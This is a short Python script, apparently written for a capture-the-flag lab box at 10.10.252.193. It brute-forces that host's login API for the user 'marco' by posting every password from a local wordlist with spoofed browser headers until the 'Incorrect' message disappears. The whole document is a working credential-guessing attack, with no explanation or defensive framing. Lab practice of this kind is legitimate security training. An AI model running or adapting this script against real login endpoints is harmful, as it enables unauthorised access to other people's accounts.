import requests as r

URL = "http://10.10.252.193/api/login"
username = "marco"
path = "/home/jezil2210/passwdEndoded.txt"
PROXY = "127.0.0.1:8080"
i = 1

def open_file(file_path):
    return [item.replace("\n","") for item in open(file_path).readlines()]

wordlist = open_file(path)

for password in wordlist:
        json = {
       	       "username":username, 
               "password":password
           }
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://10.10.252.193/login.php",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "http://10.10.252.193",
            "Host": "10.10.252.193"
           }   
        response = r.post(url=URL, headers=headers, json=json)
        if "Incorrect" in response.text:
            print("%d%s%s" % (i," Wrong password: ", password))
            i+=1
        else:
           print("Password Found: %s" % (password))
           break




      
